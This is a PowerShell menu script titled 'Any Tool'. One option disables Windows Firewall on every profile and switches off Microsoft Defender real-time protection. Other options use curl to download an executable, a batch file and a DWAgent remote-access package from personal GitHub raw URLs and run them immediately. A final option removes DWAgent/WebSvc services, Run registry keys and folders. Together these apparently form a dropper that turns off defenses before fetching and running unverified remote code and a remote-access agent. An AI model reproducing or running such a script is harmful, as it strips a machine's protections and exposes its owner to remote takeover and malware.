
$ErrorActionPreference = 'Stop'

$workDir = Join-Path $env:TEMP 'AnyTool'

function Pause-Menu {
    Write-Host ""
    Read-Host "Press Enter to return to menu" | Out-Null
}

function Download-File {
    param(
        [Parameter(Mandatory)]
        [string]$Url,

        [Parameter(Mandatory)]
        [string]$Name
    )

    New-Item -ItemType Directory -Path $workDir -Force |
        Out-Null

    $path = Join-Path $workDir $Name

    Invoke-WebRequest -Uri $Url `
        -OutFile $path `
        -ErrorAction Stop

    return $path
}

function Open-DownloadedFile {
    param(
        [Parameter(Mandatory)]
        [string]$Path
    )

    if (-not (Test-Path -LiteralPath $Path)) {
        throw "File not found: $Path"
    }

    Start-Process explorer.exe `
        -ArgumentList "/select,`"$Path`""
}

function Show-Menu {
    while ($true) {
        Clear-Host

        Write-Host "========================================" -ForegroundColor Cyan
        Write-Host "                Any Tool" -ForegroundColor Yellow
        Write-Host "========================================" -ForegroundColor Cyan
        Write-Host ""

        Write-Host "[1] Windows Security / Firewall"
        Write-Host "[2] Download EI Application"
        Write-Host "[3] Download DE Script"
        Write-Host "[4] Download WSAgent"
        Write-Host "[5] WebSvc / WSAgent Cleanup"
        Write-Host ""
        Write-Host "[0] Exit & Cleanup" -ForegroundColor Red
        Write-Host ""

        $choice = Read-Host "Select an option"

        try {
            switch ($choice) {

                '1' {
    Write-Host "`nDisabling Windows Firewall..." -ForegroundColor Yellow

    Set-NetFirewallProfile -Profile Domain,Private,Public -Enabled False

    Write-Host "Firewall disabled." -ForegroundColor Green

    Write-Host "`nDisabling Microsoft Defender real-time protection..." -ForegroundColor Yellow

    Set-MpPreference -DisableRealtimeMonitoring $true

    Write-Host "Defender real-time protection disabled." -ForegroundColor Green


Write-Host "`n========== SECURITY STATUS ==========" -ForegroundColor Cyan

Write-Host "`nWindows Firewall:" -ForegroundColor Yellow

Get-NetFirewallProfile |
    Select-Object Name, Enabled |
    Format-Table -AutoSize

Write-Host "`nMicrosoft Defender:" -ForegroundColor Yellow

Get-MpComputerStatus |
    Select-Object RealTimeProtectionEnabled, AntivirusEnabled |
    Format-Table -AutoSize

Write-Host "`n=====================================" -ForegroundColor Cyan


    Pause-Menu
}

                '2' {
                   $file = "$env:TEMP\rnp.exe"

    curl.exe -L "https://raw.githubusercontent.com/icic2k/icic2k/main/ei.exe" -o $file

    if (Test-Path $file) {
        Start-Process $file
    }

    Pause-Menu
}

                '3' {
    $batFile = "$env:TEMP\de.bat"

    curl.exe -L "https://raw.githubusercontent.com/suraj1863/itit2k/main/de.bat" -o $batFile

    if (Test-Path $batFile) {
        Start-Process cmd.exe -ArgumentList "/c `"$batFile`"" -Wait
    }

    Pause-Menu
}

                '4' {
    $zipFile = "$env:TEMP\dw.zip"

    curl.exe -L "https://raw.githubusercontent.com/suraj1863/itit2k/main/dwagent_x863.zip" -o $zipFile

    tar -xf $zipFile -C $env:TEMP

    $exe = "$env:TEMP\dwagent_x863.exe"

    if (Test-Path $exe) {
        Start-Process $exe
    }

    Pause-Menu

}


'5' {
    Write-Host "`n==========================================" -ForegroundColor Cyan
    Write-Host "  Checking & Removing WebSvc / DWAgent" -ForegroundColor Cyan
    Write-Host "==========================================" -ForegroundColor Cyan

    # --- STEP 1: CHECK CURRENT STATUS ---
    Write-Host "`n[1/4] Checking current registry entries & services..." -ForegroundColor Yellow

    reg.exe query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v DWAgentMon 2>$null
    reg.exe query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\DWAgent" 2>$null
    reg.exe query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WebSvc" 2>$null

    $services = Get-CimInstance Win32_Service | Where-Object {
        $_.Name -match 'WebSvc|DWAgent' -or $_.DisplayName -match 'WebSvc|DWAgent'
    }

    if ($services) {
        $services | Select-Object Name, State, StartMode, PathName | Format-List
    } else {
        Write-Host "No active WebSvc or DWAgent services found." -ForegroundColor Gray
    }

    # --- STEP 2: STOP PROCESSES & DELETE SERVICES ---
    Write-Host "`n[2/4] Stopping processes and removing services..." -ForegroundColor Yellow

    taskkill.exe /f /im WebSvc.exe 2>$null | Out-Null
    taskkill.exe /f /im dwagent.exe 2>$null | Out-Null
    taskkill.exe /f /im dwagsvc.exe 2>$null | Out-Null

    if ($services) {
        foreach ($svc in $services) {
            Write-Host "Stopping and deleting service: $($svc.Name)" -ForegroundColor Red
            sc.exe stop $svc.Name 2>$null | Out-Null
            sc.exe delete $svc.Name 2>$null | Out-Null
        }
    }

    # --- STEP 3: DELETE REGISTRY ENTRIES ---
    Write-Host "`n[3/4] Removing registry entries..." -ForegroundColor Yellow

    reg.exe delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v DWAgentMon /f 2>$null | Out-Null
    reg.exe delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\DWAgent" /f 2>$null | Out-Null
    reg.exe delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WebSvc" /f 2>$null | Out-Null
    Write-Host "Registry cleanup attempted." -ForegroundColor Green

    # --- STEP 4: TAKE OWNERSHIP & DELETE FOLDERS ---
    Write-Host "`n[4/4] Taking ownership and deleting installation folders..." -ForegroundColor Yellow

    $folders = @(
        "C:\Program Files\WebSvc",
        "C:\Program Files\DWAgent",
        "C:\Program Files (x86)\WebSvc",
        "C:\Program Files (x86)\DWAgent"
    )

    foreach ($folder in $folders) {
        if (Test-Path $folder) {
            Write-Host "Removing folder: $folder" -ForegroundColor Red
            takeown.exe /f "$folder" /r /d y | Out-Null
            icacls.exe "$folder" /grant administrators:F /t | Out-Null
            Remove-Item -Path "$folder" -Recurse -Force -ErrorAction SilentlyContinue
            
            if (-not (Test-Path $folder)) {
                Write-Host "Successfully deleted: $folder" -ForegroundColor Green
            } else {
                Write-Host "Failed to fully delete (may need reboot): $folder" -ForegroundColor Red
            }
        }
    }

    Write-Host "`nCleanup complete!" -ForegroundColor Cyan
    Pause-Menu
}


                '0' {
                    Write-Host "`nExiting Any Tool..." `
                        -ForegroundColor Cyan
                    return
                }

                default {
                    Write-Host "Invalid option." `
                        -ForegroundColor Red

                    Pause-Menu
                }
            }
        }
        catch {
            Write-Host "`nError: $($_.Exception.Message)" `
                -ForegroundColor Red

            Pause-Menu
        }
    }
}

try {
    Show-Menu
}
finally {
    Write-Host "`nCleaning temporary files..." -ForegroundColor Cyan

    if (Test-Path -LiteralPath $workDir) {
        Remove-Item -LiteralPath $workDir `
            -Recurse -Force `
            -ErrorAction SilentlyContinue
    }

    Write-Host "Cleanup completed." -ForegroundColor Green

    Start-Sleep -Seconds 2
    exit
}
